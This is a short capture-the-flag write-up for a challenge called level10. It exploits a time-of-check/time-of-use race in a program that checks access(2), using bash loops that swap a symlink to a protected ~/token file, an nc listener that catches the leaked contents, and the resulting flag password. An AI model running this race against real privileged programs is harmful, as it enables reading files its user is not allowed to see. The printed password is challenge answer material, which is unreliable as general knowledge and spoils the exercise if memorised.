# level10

The executable `~/level10` can read `~/token` (we can't), but it won't let us because it uses `access(2)` to check if we have permission.

`access(2)` is flawed -> we can create a file we have permition to access & quickly replace it to a symlink to `~/token`

Three separate bash jobs are needed here:

```bash
# Switch between a symlink to ~/token and a bait
touch /tmp/bait;
while true; do ln -sf ~/token /tmp/lnk; ln -sf /tmp/bait /tmp/lnk; done
```

```bash
# Execute the program on the symlink in a loop
while true; do ./level10 /tmp/lnk 127.0.0.1; done
```

```bash
# Read the output
nc -klv 6969 2>/dev/null | grep -v '.*('
```

-> Password to flag10: `woupa2yuojeeaaed06riuj63c`
